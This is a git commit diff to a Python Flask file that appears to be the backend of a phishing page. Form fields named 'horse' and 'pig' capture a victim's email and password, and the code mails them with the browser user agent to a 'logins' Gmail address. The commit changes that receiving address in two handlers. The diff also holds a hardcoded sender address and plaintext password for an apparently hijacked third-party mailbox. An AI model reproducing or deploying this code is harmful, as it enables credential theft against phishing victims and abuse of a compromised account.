4778d178637d9788b2ce3e93b05fd0460c3d007b
gerencia00 <139886968+gerencia00@users.noreply.github.com>
2023-11-20 22:26:40 -0800

    Update main.py

--- main.py
+++ main.py
@@ -146,7 +146,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "eissa@waterworldwaterpark.com"
-        receiver_email = "damiandallaxlogins@gmail.com"
+        receiver_email = "damiandallaxlogins4125641@gmail.com"
         password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -183,7 +183,7 @@ def second():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "eissa@waterworldwaterpark.com"
-        receiver_email = "damiandallaxlogins@gmail.com"
+        receiver_email = "damiandallaxlogins4125641@gmail.com"
         password = "EISSA47314A"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
